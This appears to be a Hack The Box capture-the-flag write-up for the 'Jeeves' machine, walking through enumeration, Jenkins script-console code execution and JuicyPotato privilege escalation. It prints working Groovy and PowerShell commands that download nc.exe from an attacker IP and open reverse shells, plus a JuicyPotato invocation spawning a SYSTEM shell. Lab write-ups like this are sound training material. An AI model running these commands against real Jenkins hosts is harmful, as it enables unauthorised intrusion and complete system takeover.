Hack The Box "Jeeves"
## Helpful Links
- https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
- https://coldfusionx.github.io/posts/Groovy_RCE/
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
- http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/

# Initial Nmap Scan
![Pasted image 20230220162305](https://user-images.githubusercontent.com/71300144/220213851-3cd9fd74-8c59-4f11-b406-5131ddd697a5.png)


# Try to Connect ot SMB

![Pasted image 20230220163533](https://user-images.githubusercontent.com/71300144/220213942-60b262c7-be87-4cfc-9e98-e05f9dcb0363.png)
- That was a no go, so I decided to look at other options

# Website on 80

![Pasted image 20230220162401](https://user-images.githubusercontent.com/71300144/220213985-e4f9537e-ec02-4fbf-b231-4979993cb796.png)

Anytime you enter anything into the search you automatically get a picture output of

![Pasted image 20230220162455](https://user-images.githubusercontent.com/71300144/220214043-a9990b86-3d7c-4ee4-b592-52d68fcd6a5c.png)
- I tried to catpure the traffic to see what was going on but the search does not request anything, it just goes right to this picture so I did not even try sql injection. I think this was put here to throw you off and go down a rabbit hole

- I tried gobuster and came up with nothing so the next thing to do was check out the other website on port 50000

# Website on 50000

![Pasted image 20230220162652](https://user-images.githubusercontent.com/71300144/220214071-8485672a-fc12-4aec-9d41-5d6407ff0c69.png)
- again there was nothing, I used searchsploit to look up jetty and version, but came up with nothing. 
	- I did not spend long on this as Wappalyzer did not actually pick up on any software called jetty on the site.
- I then tried a couple manual directory guessing jeeves, jetty, etc.
	- came up with nothing
- I decided to use gobuster to see if there are any directoryies

## Found askjeeves Directory

![Pasted image 20230220163810](https://user-images.githubusercontent.com/71300144/220214116-f8e2ecf9-5f40-467f-b0b3-bf74f48437ea.png)
- Browsing to askjeeves

![Pasted image 20230220163942](https://user-images.githubusercontent.com/71300144/220214163-439cc02b-c016-4c3e-ad1c-aacf4e7abcad.png)

- I then Went and looked up jenkins script execution found an article and followed it. https://coldfusionx.github.io/posts/Groovy_RCE/
	- Go to Jenkins > manage jenking > script console

![Pasted image 20230220164741](https://user-images.githubusercontent.com/71300144/220214222-14711873-e344-4a7c-a903-cdc4804d46ed.png)
- First method in the blog did not work, so I went with method 2
	- First tested if I had command execution
	
	`def cmd = "cmd.exe /c dir".execute();println("${cmd.text}");`
	
	- Then uploaded nc on to target machine
	
	`def process = "powershell -command Invoke-WebRequest 'http://10.10.14.11:8080/nc.exe' -OutFile nc.exe".execute(); println("${process.text}");`
	
	- Then Executed nc on target machine
	
	`def process = "powershell -command ./nc.exe 10.10.14.11 9001 -e cmd.exe".execute(); println("${process.text}");`

# Post Enumeration and Privesc

![Pasted image 20230220164712](https://user-images.githubusercontent.com/71300144/220214415-73b3a012-a2ae-4c67-bd25-b1268f6342c4.png)

- When I logged on and got a shell I checked who I was and then the privileges I had.
- seImpersonatePrivilege was enabled which propted me to start looking into a potato attacks. I found the following github and downloaded the executable
	- https://github.com/ohpe/juicy-potato/releases
- certutil was not available on the shell neither was curl or wget, I tried dropping into powershell, but that was unresponsive.
- I then deciede to upload wget.exe from my attacker machine to the target machine with the same method I used to get nc.exe on the system through Jenkins
- Once wget.exe was downloaded on the system I used it to get the JuicyPotato.exe I downloaded off of gethub
- I realize I could have just dropped the JuicyPotato.exe onto the machine instead of wget but I figured it would be annoying to have to keep going back to Jenkins and running the same command over and over again if I needed anything else on the system, so wget was a better option.

![Pasted image 20230220165623](https://user-images.githubusercontent.com/71300144/220214390-4f1d31b9-ff41-49a4-976f-36ea35734116.png)

- I then followed the blog on hacktricks to get the JuicyPotato exploit to work
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

The biggest part of this picking a **CLSID that works I tried about 5 or six then decided to use the one provided in the example, and it worked. The one provided in the example was luckily a windows 10 professional CLSID. The target box was a based on `systeminfo` command. They used the BITS CLSID. You can find it on http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/

`.\JuicyPotato.exe -l 6666 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\Administrator\.jenkins\nc.exe -e cmd.exe 10.10.14.8 443" -t *`


![Pasted image 20230220170336](https://user-images.githubusercontent.com/71300144/220214465-25095627-5e0b-497f-982e-cd909ecc9e09.png)

- Catch the connection with your netcat listener

![Pasted image 20230220170446](https://user-images.githubusercontent.com/71300144/220214505-c7f0145a-775c-4c9a-a385-43fc6d7fdd22.png)

## Box Owned!!!

***

## Notes afterwards

### Alternate Data Streams
- The root flag was hidden in an alternate data stream
- An alternate data stream can be found by listing the directory and providing the `dir \r ` 
- type is not capable of opening this type of file so you have to use more
	`more < hm.txt:root.txt`

![InkedPasted image 20230220170902](https://user-images.githubusercontent.com/71300144/220214671-3895c462-38b1-4a39-8403-f9e1080b22f8.jpg)

